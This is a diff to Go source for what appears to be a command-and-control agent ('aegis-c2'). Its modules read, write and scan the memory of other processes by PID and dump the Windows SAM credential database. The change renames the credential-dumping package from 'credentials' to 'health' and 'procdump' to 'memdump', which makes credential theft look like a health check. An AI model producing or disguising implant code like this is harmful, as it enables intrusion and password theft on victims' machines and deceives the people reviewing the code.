@@ -8,12 +8,12 @@ import (
 	"runtime"
 	"strings"
 
-	"github.com/aegis-c2/aegis/agent/credentials"
+	"github.com/aegis-c2/aegis/agent/health"
 	"github.com/aegis-c2/aegis/agent/forwarder"
 	"github.com/aegis-c2/aegis/agent/limits"
 	"github.com/aegis-c2/aegis/agent/mountenum"
 	"github.com/aegis-c2/aegis/agent/priv"
-	"github.com/aegis-c2/aegis/agent/procdump"
+	"github.com/aegis-c2/aegis/agent/memdump"
 	"github.com/aegis-c2/aegis/agent/registry"
 	"github.com/aegis-c2/aegis/agent/service"
 	"github.com/aegis-c2/aegis/agent/uuid"
@@ -462,7 +462,7 @@ func MemoryReadModule(args string) (string, string, int) {
 		return "", "max read size is 65536 bytes", 1
 	}
 
-	data, err := procdump.ReadMemory(uint32(pid), addr, size)
+	data, err := memdump.ReadMemory(uint32(pid), addr, size)
 	if err != nil {
 		return "", err.Error(), 1
 	}
@@ -487,7 +487,7 @@ func MemoryWriteModule(args string) (string, string, int) {
 		return "", fmt.Sprintf("invalid hex data: %v", err), 1
 	}
 
-	if err := procdump.WriteMemory(uint32(pid), addr, data); err != nil {
+	if err := memdump.WriteMemory(uint32(pid), addr, data); err != nil {
 		return "", err.Error(), 1
 	}
 	return fmt.Sprintf("wrote %d bytes to pid=%d addr=0x%x", len(data), pid, addr), "", 0
@@ -510,7 +510,7 @@ func MemoryScanModule(args string) (string, string, int) {
 		return "", fmt.Sprintf("invalid hex pattern: %v", err), 1
 	}
 
-	addrs, err := procdump.ScanMemory(uint32(pid), pattern)
+	addrs, err := memdump.ScanMemory(uint32(pid), pattern)
 	if err != nil {
 		return "", err.Error(), 1
 	}
@@ -538,7 +538,7 @@ func MemoryQueryModule(args string) (string, string, int) {
 	var pid uint64
 	fmt.Sscanf(fields[0], "%d", &pid)
 
-	pages, err := procdump.QueryMemory(uint32(pid))
+	pages, err := memdump.QueryMemory(uint32(pid))
 	if err != nil {
 		return "", err.Error(), 1
 	}
@@ -559,7 +559,7 @@ func SAMDumpModule(args string) (string, string, int) {
 	if runtime.GOOS != "windows" {
 		return "", "sam_dump only available on Windows", 1
 	}
-	result, err := credentials.DumpSAM()
+	result, err := health.DumpSAM()
 	if err != nil {
 		return "", fmt.Sprintf("sam_dump failed: %v\n%s", err, result.Error), 1
 	}
